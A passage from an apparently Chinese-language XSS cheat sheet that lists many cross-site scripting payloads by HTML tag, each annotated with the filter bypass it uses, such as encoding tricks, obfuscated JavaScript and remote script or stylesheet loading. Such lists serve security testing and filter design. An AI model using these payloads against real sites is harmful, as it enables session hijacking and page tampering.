class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(1)</span>&gt;</span>CLICKME<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061lert(1)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">oninvalid</span>=<span class="string">alert(1)</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span> // 需要具有不满足其约束的元素（例如必填属性）的表单提交。（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onreset</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">reset</span>&gt;</span> // 需要点击触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">search</span> <span class="attr">onsearch</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">"Hit return"</span> <span class="attr">autofocus</span>&gt;</span> // 提交表单并且输入具有搜索的type属性时触发（Chrome）</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span> // 需要提交表单（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span>XSS // 按钮和动作</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">value</span>=<span class="string">XSS</span>&gt;</span> // 输入和形式</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">XSS</span>&gt;</span> // 形式与行动</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">x</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">label</span>&gt;</span> // 在页面上的任何位置（甚至在表单外部）单击提交元素</span><br></pre></td></tr></table></figure><h4 id="◈-lt-img-gt-标签"><a href="#◈-lt-img-gt-标签" class="headerlink" title="◈ &lt;img&gt; 标签"></a>◈ <code>&lt;img&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>"<span class="attr">xss</span>")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ımg</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>"<span class="attr">xss</span>")&gt;</span> // toUpperCase 函数将 ı 解码为 I</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  //只在chrome下有效</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(String.fromCharCode(88,83,83))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://upload-images.jianshu.io/upload_images/2836722-144777dab221babc.png?imageMogr2/auto-orient/strip|imageView2/2/w/537/format/webp"</span> <span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'1'</span> <span class="attr">onerror</span>\<span class="attr">x00</span>=<span class="string">alert(0)</span> /&gt;</span> // 绕过 onxxx= 过滤通过空字节/垂直标签</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">'1'</span>/<span class="attr">onerror</span>/=<span class="string">alert(0)</span> /&gt;</span> // 绕过空格过滤</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert%281%29"</span>&gt;</span> // location</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">"xss:expr/*XSS*/ession(alert('XSS'))"</span>&gt;</span> // IE 浏览器</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">https://www.runoob.com/images/compatible_firefox.gif</span> <span class="attr">onloadend</span>=<span class="string">alert(1)</span>&gt;</span> // 当元素（图片）完成加载时触发（Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">https://www.runoob.com/images/compatible_firefox.gif</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span> // 当元素（图片）开始加载时触发（Firefox)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-iframe-gt-标签"><a href="#◈-lt-iframe-gt-标签" class="headerlink" title="◈ &lt;iframe&gt; 标签"></a>◈ <code>&lt;iframe&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert(14);"</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">src</span>=<span class="string">"data:text/html,&lt;svg onload=alert(1)&gt;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">⭐ <span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  // &amp;Tab;为tab字符</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;img src=1 onerror=alert(1)&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> // 使用srcdoc属性，只有 Chrome 和 Safari 6 支持 <span class="tag">&lt;<span class="name">iframe</span>&gt;</span> 标签的 srcdoc 属性。</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> // Chrome 下 srcdoc 属性</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;img src=1 onerror=alert(1)&gt;"</span>&gt;</span> // 随着现代浏览器使用空来源，iframe数据网址不再起作用</span><br></pre></td></tr></table></figure><h4 id="◈-lt-input-gt-标签"><a href="#◈-lt-input-gt-标签" class="headerlink" title="◈ &lt;input&gt; 标签"></a>◈ <code>&lt;input&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>/<span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>/<span class="attr">onclick</span>/<span class="attr">onmouseup</span>/<span class="attr">onmousedown</span>/<span class="attr">onchange</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onauxclick</span>=<span class="string">alert(1)</span>&gt;</span> // 右键单击或使用鼠标中键时触发（Chrome、Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onchange</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">xss</span>&gt;</span> // 需要属性值的变化（Chrome、Firefox、IE、Safari)（写完之后鼠标点击别处时会触发）</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">oninput</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">xss</span>&gt;</span> // 需要作为价值的变化（Chrome、Firefox、IE、Safari)（只要写入就会出发）</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onselect</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">"XSS"</span> <span class="attr">autofocus</span>&gt;</span> // 需要选择文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">accesskey</span>=<span class="string">"X"</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span> // 隐藏的输入：访问键属性可以在通常无法利用的元素上启用XSS(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-isindex-gt-标签-需要加强"><a href="#◈-lt-isindex-gt-标签-需要加强" class="headerlink" title="◈ &lt;isindex&gt; 标签(需要加强)"></a>◈ <code>&lt;isindex&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span> // Isindex和formaction（IE）</span><br></pre></td></tr></table></figure><h4 id="◈-lt-link-gt-标签-需要加强"><a href="#◈-lt-link-gt-标签-需要加强" class="headerlink" title="◈ &lt;link&gt; 标签(需要加强)"></a>◈ <code>&lt;link&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">"stylesheet"</span> <span class="attr">HREF</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">"stylesheet"</span> <span class="attr">HREF</span>=<span class="string">"http://xss.rocks/xss.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"canonical"</span> <span class="attr">accesskey</span>=<span class="string">"X"</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span> /&gt;</span> // 链接元素：访问键属性可以在通常无法利用的元素上启用XSS(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)（Firefox）</span><br></pre></td></tr></table></figure><h4 id="◈-lt-mate-gt-标签-需要加强"><a href="#◈-lt-mate-gt-标签-需要加强" class="headerlink" title="◈ &lt;mate&gt; 标签(需要加强)"></a>◈ <code>&lt;mate&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Link"</span> <span class="attr">Content</span>=<span class="string">"&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="◈-lt-marquee-gt-标签"><a href="#◈-lt-marquee-gt-标签" class="headerlink" title="◈ &lt;marquee&gt; 标签"></a>◈ <code>&lt;marquee&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">x</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>blah // MathML使任何标签都可点击 Firefox</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=//portswigger-labs.net"</span>&gt;</span> // 重定向到其他域</span><br></pre></td></tr></table></figure><h4 id="◈-lt-marquee-gt-标签-1"><a href="#◈-lt-marquee-gt-标签-1" class="headerlink" title="◈ &lt;marquee&gt; 标签"></a>◈ <code>&lt;marquee&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">onbounce</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> // 选框弹跳时触发（好像都实现不了）</span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> // 选框完成时触发（Firefox、IE)</span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> // 选框开始时触发（Firefox、IE)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-object-gt-标签"><a href="#◈-lt-object-gt-标签" class="headerlink" title="◈ &lt;object&gt; 标签"></a>◈ <code>&lt;object&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=============================== 通讯协议 ==============================</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span> // 具有JavaScript协议的对象data属性(Firefox)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-p-gt-标签"><a href="#◈-lt-p-gt-标签" class="headerlink" title="◈ &lt;p&gt; 标签"></a>◈ <code>&lt;p&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>/<span class="attr">onmouseover</span>=<span class="string">javascript:alert(1);</span> &gt;</span>M<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  //如果发现变量输出在p标签中，只要能跳出""就足够了</span><br></pre></td></tr></table></figure><h4 id="◈-lt-script-gt-标签"><a href="#◈-lt-script-gt-标签" class="headerlink" title="◈ &lt;script&gt; 标签"></a>◈ <code>&lt;script&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ſcript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span> // toUpperCase 函数将 ſ 解码为 S</span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpt</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">ScRipt</span>&gt;</span> // 大小写绕过标签黑名单</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://马赛克/payload.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>[<span class="string">'alert'</span>](<span class="built_in">document</span>[<span class="string">'domain'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 绕过点（.）的限制</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript,alert(/xss/)</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 脚本src中的数据协议</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript;base64,YWxlcnQoMSk</span>=&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 带有base64的脚本src中的数据协议</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">href</span>=<span class="string">"data:text/javascript,alert(1)"</span> /&gt;</span><span class="actionscript"> <span class="comment">// SVG脚本href属性，（IE、Firefox）无需关闭脚本标签,（Google）需要关闭</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(/xss/)</span>&gt;</span><span class="undefined"></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">import</span>(<span class="string">'data:text/javascript,alert(1)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 带有数据URL的导入语句</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>,<span class="number">49</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006C\u0065\u0072\u0074(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Unicode转义</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u&#123;61&#125;lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Unicode转义ES6样式</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u&#123;0000000061&#125;lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Unicode转义ES6样式零填充</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'\x61lert(1)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 十六进制编码JavaScript转义</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'\141lert(1)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 八进制编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'alert(\061)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 八进制编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'alert(\61)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 八进制编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  // 使用反引号绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$=~[];$=&#123;<span class="attr">___</span>:++$,<span class="attr">$$$$</span>:(![]+<span class="string">""</span>)[$],<span class="attr">__$</span>:++$,<span class="attr">$_$_</span>:(![]+<span class="string">""</span>)[$],<span class="attr">_$_</span>:++$,<span class="attr">$_$$</span>:(&#123;&#125;+<span class="string">""</span>)[$],<span class="attr">$$_$</span>:($[$]+<span class="string">""</span>)[$],<span class="attr">_$$</span>:++$,<span class="attr">$$$_</span>:(!<span class="string">""</span>+<span class="string">""</span>)[$],<span class="attr">$__</span>:++$,<span class="attr">$_$</span>:++$,<span class="attr">$$__</span>:(&#123;&#125;+<span class="string">""</span>)[$],<span class="attr">$$_</span>:++$,<span class="attr">$$$</span>:++$,<span class="attr">$___</span>:++$,<span class="attr">$__$</span>:++$&#125;;$.$_=($.$_=$+<span class="string">""</span>)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+<span class="string">""</span>)[$.__$])+((!$)+<span class="string">""</span>)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!<span class="string">""</span>+<span class="string">""</span>)[$.__$])+($._=(!<span class="string">""</span>+<span class="string">""</span>)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!<span class="string">""</span>+<span class="string">""</span>)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+<span class="string">"\""</span>+$.$_$_+(![]+<span class="string">""</span>)[$._$_]+$.$$$_+<span class="string">"\\"</span>+$.__$+$.$$_+$._$_+$.__+<span class="string">"("</span>+$.___+<span class="string">")"</span>+<span class="string">"\""</span>)())();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefinedspan><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">===============================限制字符====================================</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用异常处理</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，无分号，使用异常处理</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">throw</span> onerror=alert,<span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号的异常处理，没有使用表达式的半冒号</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,<span class="string">'=alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号异常处理和evil</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">'alert\x281\x29'</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，在Firefox上使用异常处理和evil</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">'alert\x281\x29'</span><span class="keyword">instanceof</span>&#123;[<span class="built_in">Symbol</span>.hasInstance]:<span class="built_in">eval</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用ES6 hasInstance和instanceof与eval</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">'alert\x281\x29'</span><span class="keyword">instanceof</span>&#123;[<span class="built_in">Symbol</span>[<span class="string">'hasInstance'</span>]]:<span class="built_in">eval</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用ES6的hasInstance和instanceof以及eval</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">location=<span class="string">'javascript:alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用位置重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">location=name</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无字符串，使用位置没有括号重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用模板字符串</span><br></pre></td></tr></table></figure><h4 id="◈-lt-style-gt-标签-需要加强"><a href="#◈-lt-style-gt-标签-需要加强" class="headerlink" title="◈ &lt;style&gt; 标签(需要加强)"></a>◈ <code>&lt;style&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@import'http://xss.rocks/xss.css';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">-moz-binding</span>:<span class="built_in">url</span>(<span class="string">"http://xss.rocks/xssmoz.xml#xss"</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@im\port'\ja\vasc\ript:alert("XSS")';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 